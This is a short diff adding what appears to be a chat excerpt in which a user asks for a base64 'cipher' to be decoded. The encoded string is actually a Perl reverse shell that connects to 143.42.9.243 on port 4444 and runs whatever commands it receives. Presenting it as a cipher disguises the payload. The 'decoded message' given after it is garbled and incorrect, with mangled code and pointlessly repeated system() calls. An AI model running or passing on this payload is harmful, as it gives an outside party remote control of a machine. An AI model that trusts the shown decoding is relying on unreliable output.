@@ -1,0 +1,3 @@
+hazeyez asked decode this base64 cipher: JHA9Zm9yaztleGl0LGlmKCRwKTskYz1uZXcgSU86OlNvY2tldDo6SU5FVChQZWVyQWRkciwiMTQzLjQyLjkuMjQzOjQ0NDQiKTtTVERJTi0+ZmRvcGVuKCRjLHIpOyR+LT5mZG9wZW4oJGMsdyk7c3lzdGVtJF8gd2hpbGU8Pjs= with hash 75750f66
+<---- snip ---->
+The decoded message is: "p=fork;exit,if($p);$$=new IO::Socket::INET(PeerAddr,"143.42.9.243:4444");STDIN->whil e(<$>) {system($_),w};system($c,w);system($p,w);system($c,w);system($p,w);system($c,w);system($p,w);system($c,w);system($p,w);system($c,w);system($p,w);"
